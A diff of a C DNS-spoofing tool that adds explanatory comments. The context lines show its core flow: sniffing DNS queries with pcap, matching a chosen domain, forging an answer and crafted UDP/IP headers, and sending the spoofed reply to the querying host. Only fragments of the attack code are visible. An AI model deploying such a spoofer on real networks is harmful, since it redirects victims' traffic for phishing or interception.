@@ -82,6 +82,9 @@ void usage(char *prog_name){
   exit(-1);
 }
 
+/**
+ * Parse arguments 
+ */
 void parse_args(int argc, char *argv[], SpoofParams *spoof_params){
   
   unsigned int i; /* iterator */
@@ -162,6 +165,8 @@ void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsq
 
 /**
  * Extracts the request from a dns query
+ * It comes in this format: [3]www[7]example[3]com[0]
+ * And it is returned in this: www.example.com
  */
 void extract_dns_request(struct dnsquery *dns_query, char *request){
   unsigned int i, j, k;
@@ -331,11 +336,21 @@ void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char 
   extract_dns_data(packet, &dns_hdr, &dns_query, src_ip, dst_ip, &port);
   extract_dns_request(&dns_query, request);
   
+  /* if it is the request that we are looking for */
   if(!strcmp(request, spoof_params->request)){
+    /* answer is pointed to the beginning of dns header*/
     answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);
+    
+    /* modifies answer to attend our dns spoof and returns its size */
     datagram_size = build_dns_answer(spoof_params, dns_hdr, answer, request);
+
+    /* modifies udp/ip to attend our dns spoof */
     build_udp_ip_datagram(datagram, datagram_size, src_ip, dst_ip, port);
+
+    /* update the datagram size with ip and udp header*/
     datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
+
+    /* sends our dns spoof msg */
     send_dns_answer(src_ip, port, datagram, datagram_size);
     print_message(request, src_ip);
   }
@@ -395,6 +410,10 @@ void run_filter(SpoofParams *spoof_params){
   pcap_close(handle);
 }
 
+/**
+ * This is the main function
+ * Gets the args and runs the filter
+ */
 int main(int argc, char **argv){
   SpoofParams spoof_params; /* arguments */
   
@@ -404,3 +423,4 @@ int main(int argc, char **argv){
   
   return 0;
 }
+
